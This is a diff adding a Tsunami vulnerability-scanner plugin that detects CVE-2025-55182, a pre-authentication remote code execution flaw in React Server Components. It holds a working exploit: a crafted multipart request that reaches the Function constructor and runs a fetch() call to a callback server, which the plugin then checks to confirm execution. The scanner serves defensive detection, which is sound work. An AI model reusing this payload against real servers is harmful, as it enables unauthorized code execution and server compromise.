@@ -1,0 +1,68 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "ReactServerComponents_CVE_2025_55182"
+  author: "Tsunami Team (tsunami-dev@google.com)"
+  version: "1.0"
+}
+
+finding: {
+  main_id: {
+    publisher: "GOOGLE"
+    value: "CVE-2025-55182"
+  }
+  severity: CRITICAL
+  title: "React Server Components Pre Auth RCE (CVE-2025-55182)"
+  description: "A pre-authentication remote code execution vulnerability exists in React Server Components versions 19.0.0, 19.1.0, 19.1.1, and 19.2.0 including the following packages: react-server-dom-parcel, react-server-dom-turbopack, and react-server-dom-webpack. The vulnerable code unsafely deserializes payloads from HTTP requests to Server Function endpoints."
+  recommendation: "Update React Server Components to the latest version."
+  related_id: {
+    publisher: "CVE"
+    value: "CVE-2025-55182"
+  }
+}
+
+config: {}
+
+###########
+# ACTIONS #
+###########
+
+actions: {
+  name: "cve_2025_55182_trigger_code_execution"
+  http_request: {
+    client_options: {
+      ignore_http_client_errors: true
+    }
+    method: POST
+    uri: "/"
+    headers: [
+      { name: "next-action" value: "x" },
+      { name: "content-type" value: "multipart/form-data; boundary=----formdata-undici-009352106678" }
+    ]
+    # Executed payload: `fetch("{{tsunami_callback_endpoint}}").then(r => r.text()).then(t => console.log(t))`
+    # CREDIT: thank you Lachlan Davidson (https://github.com/lachlan2k) for sharing the POC.
+    data: "------formdata-undici-009352106678\r\nContent-Disposition: form-data; name=\"0\"\r\n\r\n\"$1\"\r\n------formdata-undici-009352106678\r\nContent-Disposition: form-data; name=\"1\"\r\n\r\n{\"status\":\"resolved_model\",\"reason\":0,\"_response\":\"$4\",\"value\":\"{\\\"then\\\":\\\"$3:map\\\",\\\"0\\\":{\\\"then\\\":\\\"$B3\\\"},\\\"length\\\":1}\",\"then\":\"$2:then\"}\r\n------formdata-undici-009352106678\r\nContent-Disposition: form-data; name=\"2\"\r\n\r\n\"$@3\"\r\n------formdata-undici-009352106678\r\nContent-Disposition: form-data; name=\"3\"\r\n\r\n[]\r\n------formdata-undici-009352106678\r\nContent-Disposition: form-data; name=\"4\"\r\n\r\n{\"_prefix\":\"fetch(\\\"{{ T_CBS_URI }}\\\").then(r => r.text()).then(t => console.log(t))//\",\"_formData\":{\"get\":\"$3:constructor:constructor\"},\"_chunks\":\"$2:_response:_chunks\"}\r\n------formdata-undici-009352106678--\r\n"
+  }
+}
+actions: {
+  name: "check_callback_server_logs"
+  callback_server: { action_type: CHECK }
+}
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  condition: REQUIRES_CALLBACK_SERVER
+  actions: [
+    "cve_2025_55182_trigger_code_execution",
+    "check_callback_server_logs"
+  ]
+}
